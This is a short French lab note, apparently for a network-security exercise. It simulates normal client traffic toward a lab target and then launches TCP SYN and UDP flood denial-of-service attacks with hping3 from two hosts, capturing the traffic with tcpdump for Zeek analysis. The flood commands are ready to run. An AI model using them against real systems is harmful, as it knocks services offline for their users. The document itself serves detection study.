# **Simulation de trafic normal + Attaque DoS**

- **IP de la cible** : 192.168.10.2 (**Guest2Zone1**)
- **IP des clients (trafic normal)** : 192.168.20.1, 192.168.40.1, 192.168.30.2, 192.168.30.1, 192.168.10.252, 192.168.10.253, 192.168.10.1
- **IP de l'attaquant (DoS)** : 192.168.30.3 (**Guest1Zone3**)
                                192.168.40.2 (**Guest1Zone4**)


- **192.168.20.1** : `while true; do echo "DNS request" | nc -u 192.168.10.2 53; sleep 0.5; done`
- **192.168.40.1** : `while true; do curl http://192.168.10.2:80 & sleep 1; done`
- **192.168.30.2** : `while true; do echo "NTP request" | nc -u 192.168.10.2 123; sleep 1; done`
- **192.168.30.1** : `while true; do echo "random data" | nc -u 192.168.10.2 500; sleep 1; done`
- **192.168.10.252** : `while true; do ping -c 1 192.168.10.2; sleep 1; done`
- **192.168.10.253** : `while true; do curl -X POST http://192.168.10.2:8080 & sleep 2; done`
- **192.168.10.1** : `while true; do nc -zv 192.168.10.2 22; sleep 3; done`

## **Attaque DoS**
- **192.168.30.3 (TCP SYN Flood - Guest1Zone3)** : `sudo hping3 -S --flood -p 80 192.168.10.2`
- **192.168.40.2 (UDP Flood - Guest1Zone4)** : `sudo hping3 --flood --udp -p 53 -d 1400 192.168.10.2`
  
## **Capture du trafic**
- **Sur la cible (Guest2Zone1)** : `sudo tcpdump -i ens3 -w attaque_dos_all_users.pcap`

## **Lecture des capture sur Zeek**
- **Sur la cible (Guest2Zone1)** : `zeek -C -r attaque_dos_all_users.pcap`
  Et ensuite des fichiers log seront générés.
